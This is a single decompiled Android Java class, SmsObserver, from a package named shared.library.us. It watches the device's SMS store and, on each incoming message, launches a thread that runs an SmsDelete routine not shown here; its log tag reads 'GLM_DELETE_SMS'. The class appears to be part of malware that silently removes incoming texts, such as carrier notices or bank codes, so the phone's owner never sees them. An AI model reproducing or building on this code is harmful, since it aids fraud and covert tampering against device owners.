package shared.library.us;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class SmsObserver extends ContentObserver {
    private static final String TAG = "GLM_DELETE_SMS";
    /* access modifiers changed from: private */
    public Context mCtx;
    private Handler mHandler;

    public SmsObserver(Handler handler, Context ctx) {
        super(handler);
        this.mHandler = handler;
        this.mCtx = ctx;
    }

    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        try {
            Cursor cur = this.mCtx.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
            if (cur != null && cur.getCount() > 0) {
                cur.moveToNext();
                if (cur.getString(cur.getColumnIndex("protocol")) != null) {
                    onSmsReceive();
                }
                cur.close();
            }
        } catch (Exception e) {
            Log.i(TAG, "SmsObserver Error - " + e.getMessage());
        }
    }

    private void onSmsReceive() {
        new Thread() {
            public void run() {
                new SmsDelete(SmsObserver.this.mCtx).Start();
            }
        }.start();
    }
}
